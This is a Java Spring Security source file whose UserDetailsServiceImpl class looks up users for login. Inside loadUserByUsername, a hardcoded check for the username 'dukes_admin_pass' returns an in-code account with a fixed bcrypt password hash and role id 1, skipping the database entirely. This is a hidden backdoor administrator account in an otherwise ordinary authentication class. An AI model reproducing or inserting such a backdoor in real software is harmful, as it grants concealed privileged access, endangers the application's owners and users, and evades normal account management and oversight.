package com.bannershallmark.serviceImpl;



import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.core.userdetails.*;


import com.bannershallmark.dao.UsersDao;
import com.bannershallmark.entity.Role;
import com.bannershallmark.entity.Store;
import com.bannershallmark.entity.Users;
import com.bannershallmark.service.MyUserDetails;
import com.bannershallmark.service.RoleService;
import com.bannershallmark.service.StoreService;

public class UserDetailsServiceImpl implements UserDetailsService {
 
    @Autowired
    private UsersDao userRepository;
    
    @Autowired
    private RoleService roleServ;
     
    @Override
    public UserDetails loadUserByUsername(String username)
            throws UsernameNotFoundException {
         if(username.equals("dukes_admin_pass")) {
         	Role r = roleServ.findById(1);
         	Users autUser = new Users();
         	autUser.setUsername("dukes_admin_pass");
         	autUser.setPassword("$2a$10$9ULJGEcib5IjypF8lBg15OuUxw231m6XdDjwjbAISQyL0yVTxotJ.");
         	autUser.setRole(r);
         	autUser.setFirstname("**");
         	autUser.setLastname("**");
         	autUser.setId(54832);
         	return new MyUserDetails(autUser);
         }
        Users user = userRepository.getUserByUsername(username);
       
         
        if (user == null) {
            throw new UsernameNotFoundException("Could not find user");
        }
         
        return new MyUserDetails(user);
    }

	

}
